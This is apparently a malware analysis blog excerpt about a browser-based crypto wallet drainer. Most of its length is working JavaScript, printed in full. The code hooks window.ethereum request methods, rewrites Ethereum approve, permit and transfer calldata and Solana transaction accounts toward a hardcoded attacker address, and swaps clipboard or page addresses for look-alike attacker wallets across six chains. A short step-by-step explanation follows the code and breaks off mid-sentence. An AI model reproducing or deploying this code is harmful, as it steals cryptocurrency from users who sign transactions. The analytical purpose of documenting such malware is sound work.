    var _0x2e3cca = ["bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm", "bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9", "bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx", "bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4", "bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar", "bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh", "bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h", "bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt", "bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx", "bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh", "bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq", "bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f", "bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn", "bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4", "bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30", "bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7", "bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4", "bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6", "bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr", "bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79", "bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m", "bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz", "bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu", "bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5", "bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf", "bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk", "bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st", "bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u", "bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd", "bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u", "bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp", "bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej", "bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29", "bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq", "bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a", "bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my", "bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw", "bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55", "bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw", "bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037"];
    var _0x4477fc = ["0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976", "0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024", "0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B", "0x30F895a2C66030795131FB66CBaD6a1f91461731", "0x57394449fE8Ee266Ead880D5588E43501cb84cC7", "0xCd422cCC9f6e8f30FfD6F68C0710D3a7F24a026A", "0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4", "0xe86749d6728d8b02c1eaF12383c686A8544de26A", "0xa4134741a64F882c751110D3E207C51d38f6c756", "0xD4A340CeBe238F148034Bbc14478af59b1323d67", "0xB00A433e1A5Fc40D825676e713E5E351416e6C26", "0xd9Df4e4659B1321259182191B683acc86c577b0f", "0x0a765FA154202E2105D7e37946caBB7C2475c76a", "0xE291a6A58259f660E8965C2f0938097030Bf1767", "0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D", "0xa7eec0c4911ff75AEd179c81258a348c40a36e53", "0x3c6762469ea04c9586907F155A35f648572A0C3E", "0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2", "0x51Bb31a441531d34210a4B35114D8EF3E57aB727", "0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1", "0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966", "0x1914F36c62b381856D1F9Dc524f1B167e0798e5E", "0xB9e9cfd931647192036197881A9082cD2D83589C", "0xE88ae1ae3947B6646e2c0b181da75CE3601287A4", "0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2", "0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68", "0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d", "0x93Ff376B931B92aF91241aAf257d708B62D62F4C", "0x5C068df7139aD2Dedb840ceC95C384F25b443275", "0x70D24a9989D17a537C36f2FB6d8198CC26c1c277", "0x0ae487200606DEfdbCEF1A50C003604a36C68E64", "0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56", "0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673", "0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3", "0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769", "0xd299f05D1504D0B98B1D6D3c282412FD4Df96109", "0x241689F750fCE4A974C953adBECe0673Dc4956E0", "0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261", "0x5651dbb7838146fCF5135A65005946625A2685c8", "0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1", "0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3", "0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9", "0x013285c02ab81246F1D68699613447CE4B2B4ACC", "0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e", "0x4Bf0C0630A562eE973CE964a7d215D98ea115693", "0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb", "0xae9935793835D5fCF8660e0D45bA35648e3CD463", "0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027", "0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D", "0x06de68F310a86B10746a4e35cD50a7B7C8663b8d", "0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54", "0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf", "0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272", "0xe8749d2347472AD1547E1c6436F267F0EdD725Cb", "0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221", "0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3", "0xC4A51031A7d17bB6D02D52127D2774A942987D39", "0xa1b94fC12c0153D3fb5d60ED500AcEC430259751", "0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223", "0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04"];
    var _0x514d7d = ["5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6", "98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ", "Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt", "CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN", "7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU", "3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49", "9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV", "4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF", "4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF", "9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL", "7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx", "8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv", "55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx", "Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB", "9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB", "5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr", "F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv", "G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn", "DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K", "HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced"];
    var _0x3ee86f = ["TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67", "TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y", "TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH", "TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc", "TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp", "TGExvgwAyaqwcaJmtJzErXqfra66YjLThc", "TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG", "TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye", "TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp", "TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR", "TPSLojAyTheudTRztqjhNic6rrrSLVkMAr", "TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo", "TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw", "TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f", "TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ", "TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb", "TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP", "TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW", "TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz", "TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW", "TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt", "TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC", "TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ", "THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E", "TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6", "TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L", "TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9", "TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK", "TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V", "TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn", "TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA", "TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt", "TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ", "TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs", "TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL", "TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z", "THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5", "TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP", "TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7", "TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P"];
    var _0x4a9d96 = ["LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug", "LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR", "LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6", "LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz", "LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa", "LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ", "LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT", "LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB", "Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP", "LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA", "Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP", "LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox", "LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP", "LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6", "LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ", "LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H", "LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq", "LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE", "LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr", "LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9", "LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC", "LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v", "LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V", "LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR", "LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg", "LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k", "LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk", "LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN", "Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT", "LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs", "LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw", "LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X", "LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU", "LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq", "LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe", "LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV", "LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ", "Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu", "LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK", "LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z"];
    var _0x553dcb = ["bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh", "bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9", "bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz", "bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf", "bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39", "bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97", "bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823", "bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3", "bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64", "bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8", "bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt", "bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er", "bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz", "bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s", "bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7", "bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed", "bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw", "bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa", "bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc", "bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd", "bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl", "bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g", "bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf", "bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u", "bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck", "bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3", "bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj", "bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064", "bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7", "bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j", "bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6", "bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59", "bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu", "bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l", "bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7", "bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q", "bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3", "bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad", "bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5", "bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"];
    const _0x3ec3bb = {
      'ethereum': /\b0x[a-fA-F0-9]{40}\b/g,
      'bitcoinLegacy': /\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g,
      'bitcoinSegwit': /\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g,
      'tron': /((?<!\w)[T][1-9A-HJ-NP-Za-km-z]{33})/g,
      'bch': /bitcoincash:[qp][a-zA-Z0-9]{41}/g,
      'ltc': /(?<!\w)ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}\b/g,
      'ltc2': /(?<!\w)[mlML][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
      'solana': /((?<!\w)[4-9A-HJ-NP-Za-km-z][1-9A-HJ-NP-Za-km-z]{32,44})/g,
      'solana2': /((?<!\w)[3][1-9A-HJ-NP-Za-km-z]{35,44})/g,
      'solana3': /((?<!\w)[1][1-9A-HJ-NP-Za-km-z]{35,44})/g
    };
    for (const [_0x17ccd4, _0x129783] of Object.entries(_0x3ec3bb)) {
      const _0x1be350 = _0x530d91.match(_0x129783) || [];
      for (const _0x4225ce of _0x1be350) {
        if (_0x17ccd4 == "ethereum") {
          if (!_0x4477fc.includes(_0x4225ce) && neth == 0) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4477fc));
          }
        }
        if (_0x17ccd4 == "bitcoinLegacy") {
          if (!_0x264994.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x264994));
          }
        }
        if (_0x17ccd4 == "bitcoinSegwit") {
          if (!_0x2e3cca.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x2e3cca));
          }
        }
        if (_0x17ccd4 == "tron") {
          if (!_0x3ee86f.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x3ee86f));
          }
        }
        if (_0x17ccd4 == "ltc") {
          if (!_0x4a9d96.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96));
          }
        }
        if (_0x17ccd4 == "ltc2") {
          if (!_0x4a9d96.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96));
          }
        }
        if (_0x17ccd4 == "bch") {
          if (!_0x553dcb.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x553dcb));
          }
        }
        const _0x2d452a = [..._0x4477fc, ..._0x264994, ..._0x2e3cca, ..._0x3ee86f, ..._0x4a9d96, ..._0x553dcb];
        const _0x35f871 = _0x2d452a.includes(_0x4225ce);
        if (_0x17ccd4 == "solana" && !_0x35f871) {
          if (!_0x514d7d.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d));
          }
        }
        if (_0x17ccd4 == "solana2" && !_0x35f871) {
          if (!_0x514d7d.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d));
          }
        }
        if (_0x17ccd4 == "solana3" && _0x35f871) {
          if (!_0x514d7d.includes(_0x4225ce)) {
            _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d));
          }
        }
      }
    }
    return _0x530d91;
  }
}
async function runmask() {
  let _0x1c41fa = 0;
  let _0x2a20cb = new Map();
  let _0x1ab7cb = false;
  function _0x1089ae(_0x4ac357, _0xc83c36 = true) {
    const _0x13d8ee = JSON.parse(JSON.stringify(_0x4ac357));
    if (_0xc83c36) {
      if (_0x13d8ee.value && _0x13d8ee.value !== "0x0" && _0x13d8ee.value !== '0') {
        _0x13d8ee.to = "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976";
      }
      if (_0x13d8ee.data) {
        const _0x250e27 = _0x13d8ee.data.toLowerCase();
        if (_0x250e27.startsWith("0x095ea7b3")) {
          if (_0x250e27.length >= 74) {
            const _0x7fa5f0 = _0x250e27.substring(0, 10);
            const _0x15c4f9 = '0x' + _0x250e27.substring(34, 74);
            const _0xde14cc = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, '0');
            const _0x3e4a11 = 'f'.repeat(64);
            _0x13d8ee.data = _0x7fa5f0 + _0xde14cc + _0x3e4a11;
            const _0x432d38 = {
              '0x7a250d5630b4cf539739df2c5dacb4c659f2488d': "Uniswap V2",
              '0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af': "Uniswap V2",
              '0xe592427a0aece92de3edee1f18e0157c05861564': "Uniswap V3",
              '0x10ed43c718714eb63d5aa57b78b54704e256024e': "PancakeSwap V2",
              '0x13f4ea83d0bd40e75c8222255bc855a974568dd4': "PancakeSwap V3",
              '0x1111111254eeb25477b68fb85ed929f73a960582': "1inch",
              '0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f': "SushiSwap"
            };
            const _0x13f774 = _0x432d38[_0x15c4f9.toLowerCase()];
            if (_0x13f774) {
              console.log(_0x13f774 + _0x15c4f9);
            } else {
              console.log(_0x15c4f9);
            }
          }
        } else {
          if (_0x250e27.startsWith("0xd505accf")) {
            if (_0x250e27.length >= 458) {
              const _0x571743 = _0x250e27.substring(0, 10);
              const _0x55e7fa = _0x250e27.substring(10, 74);
              const _0x382fb5 = _0x250e27.substring(202, 266);
              const _0x5bb3a7 = _0x250e27.substring(266, 330);
              const _0x2e5118 = _0x250e27.substring(330, 394);
              const _0x3ba273 = _0x250e27.substring(394, 458);
              const _0x36b084 = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, '0');
              const _0x15389e = 'f'.repeat(64);
              _0x13d8ee.data = _0x571743 + _0x55e7fa + _0x36b084 + _0x15389e + _0x382fb5 + _0x5bb3a7 + _0x2e5118 + _0x3ba273;
            }
          } else {
            if (_0x250e27.startsWith("0xa9059cbb")) {
              if (_0x250e27.length >= 74) {
                const _0x5d2193 = _0x250e27.substring(0, 10);
                const _0x1493e2 = _0x250e27.substring(74);
                const _0x32c34c = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, '0');
                _0x13d8ee.data = _0x5d2193 + _0x32c34c + _0x1493e2;
              }
            } else {
              if (_0x250e27.startsWith("0x23b872dd")) {
                if (_0x250e27.length >= 138) {
                  const _0x5c5045 = _0x250e27.substring(0, 10);
                  const _0x1ebe01 = _0x250e27.substring(10, 74);
                  const _0x558b46 = _0x250e27.substring(138);
                  const _0x56d65b = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, '0');
                  _0x13d8ee.data = _0x5c5045 + _0x1ebe01 + _0x56d65b + _0x558b46;
                }
              }
            }
          }
        }
      } else if (_0x13d8ee.to && _0x13d8ee.to !== "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976") {
        _0x13d8ee.to = "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976";
      }
    } else {
      if (_0x13d8ee.instructions && Array.isArray(_0x13d8ee.instructions)) {
        _0x13d8ee.instructions.forEach(_0x190501 => {
          if (_0x190501.accounts && Array.isArray(_0x190501.accounts)) {
            _0x190501.accounts.forEach(_0x2b9990 => {
              if (typeof _0x2b9990 === "string") {
                _0x2b9990 = "19111111111111111111111111111111";
              } else if (_0x2b9990.pubkey) {
                _0x2b9990.pubkey = "19111111111111111111111111111111";
              }
            });
          }
          if (_0x190501.keys && Array.isArray(_0x190501.keys)) {
            _0x190501.keys.forEach(_0x40768f => {
              if (_0x40768f.pubkey) {
                _0x40768f.pubkey = "19111111111111111111111111111111";
              }
            });
          }
        });
      }
      if (_0x13d8ee.recipient) {
        _0x13d8ee.recipient = "19111111111111111111111111111111";
      }
      if (_0x13d8ee.destination) {
        _0x13d8ee.destination = "19111111111111111111111111111111";
      }
    }
    return _0x13d8ee;
  }
  function _0x485f9d(_0x38473f, _0x292c7a) {
    return async function (..._0x59af19) {
      _0x1c41fa++;
      let _0x12a7cb;
      try {
        _0x12a7cb = JSON.parse(JSON.stringify(_0x59af19));
      } catch (_0x5d1767) {
        _0x12a7cb = [..._0x59af19];
      }
      if (_0x59af19[0] && typeof _0x59af19[0] === "object") {
        const _0x2c3d7e = _0x12a7cb[0];
        if (_0x2c3d7e.method === "eth_sendTransaction" && _0x2c3d7e.params && _0x2c3d7e.params[0]) {
          try {
            const _0x39ad21 = _0x1089ae(_0x2c3d7e.params[0], true);
            _0x2c3d7e.params[0] = _0x39ad21;
          } catch (_0x226343) {}
        } else {
          if ((_0x2c3d7e.method === "solana_signTransaction" || _0x2c3d7e.method === "solana_signAndSendTransaction") && _0x2c3d7e.params && _0x2c3d7e.params[0]) {
            try {
              let _0x5ad975 = _0x2c3d7e.params[0];
              if (_0x5ad975.transaction) {
                _0x5ad975 = _0x5ad975.transaction;
              }
              const _0x5dbe63 = _0x1089ae(_0x5ad975, false);
              if (_0x2c3d7e.params[0].transaction) {
                _0x2c3d7e.params[0].transaction = _0x5dbe63;
              } else {
                _0x2c3d7e.params[0] = _0x5dbe63;
              }
            } catch (_0x4b99fd) {}
          }
        }
      }
      const _0x1cbb37 = _0x38473f.apply(this, _0x12a7cb);
      if (_0x1cbb37 && typeof _0x1cbb37.then === "function") {
        return _0x1cbb37.then(_0xea3332 => _0xea3332)["catch"](_0x35d6a3 => {
          throw _0x35d6a3;
        });
      }
      return _0x1cbb37;
    };
  }
  function _0x41630a(_0x5d6d52) {
    if (!_0x5d6d52) {
      return false;
    }
    let _0x2fc35d = false;
    const _0xfafee = ["request", "send", "sendAsync"];
    for (const _0x16ab0e of _0xfafee) {
      if (typeof _0x5d6d52[_0x16ab0e] === "function") {
        const _0x58cddf = _0x5d6d52[_0x16ab0e];
        _0x2a20cb.set(_0x16ab0e, _0x58cddf);
        try {
          Object.defineProperty(_0x5d6d52, _0x16ab0e, {
            'value': _0x485f9d(_0x58cddf, _0x16ab0e),
            'writable': true,
            'configurable': true,
            'enumerable': true
          });
          _0x2fc35d = true;
        } catch (_0x19546c) {}
      }
    }
    if (_0x2fc35d) {
      _0x1ab7cb = true;
    }
    return _0x2fc35d;
  }
  function _0xfc3320() {
    let _0x4f0cd6 = 0;
    const _0x5b507d = () => {
      _0x4f0cd6++;
      if (window.ethereum) {
        setTimeout(() => {
          _0x41630a(window.ethereum);
        }, 500);
        return;
      }
      if (_0x4f0cd6 < 50) {
        setTimeout(_0x5b507d, 100);
      }
    };
    _0x5b507d();
  }
  _0xfc3320();
  window.stealthProxyControl = {
    'isActive': () => _0x1ab7cb,
    'getInterceptCount': () => _0x1c41fa,
    'getOriginalMethods': () => _0x2a20cb,
    'forceShield': () => {
      if (window.ethereum) {
        return _0x41630a(window.ethereum);
      }
      return false;
    }
  };
}‍This malware is essentially a browser-based interceptor that hijacks both network traffic and application APIs. It injects itself into functions like fetch, XMLHttpRequest, and common wallet interfaces, then silently rewrites values in requests and responses. That means any sensitive identifiers, such as payment destinations or approval targets, can be swapped out for attacker, controlled ones before the user even sees or signs them. To make the changes harder to notice, it uses string-matching logic that replaces targets with look-alike values.What makes it dangerous is that it operates at multiple layers: altering content shown on websites, tampering with API calls, and manipulating what users’ apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background. 🛠 How the Malware Works (Step by Step)Injects itself into the browserHooks core functions like fetch, XMLHttpRequest, and wallet APIs (window.ethereum, Solana, etc.).Ensures it can intercept both web traffic and wallet activity.Watches for sensitive dataScans network responses and transaction payloads for anything that looks like a wallet address or transfer.Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.Rewrites the targetsReplaces the legitimate destination with an attacker-controlled address.Uses “lookalike” addresses (via string-matching) to make swaps less obvious.Hijacks transactions before they’re signedAlters Ethereum and Solana transaction parameters (e.g., 